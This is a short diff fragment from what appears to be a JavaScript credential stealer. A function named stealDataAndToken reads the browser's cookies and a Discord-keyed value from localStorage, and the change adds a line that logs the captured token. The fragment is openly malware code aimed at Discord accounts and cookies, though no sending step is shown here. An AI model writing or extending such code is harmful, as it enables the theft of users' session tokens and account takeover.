@@ -3,6 +3,8 @@ function stealDataAndToken() {
     var cookies = document.cookie;
     
     var token = localStorage.getItem('https://discord.com');
+    console.log('Token from local storage:', token); // Log the token value
+
     var discordToken = null;
 
     if (token) {
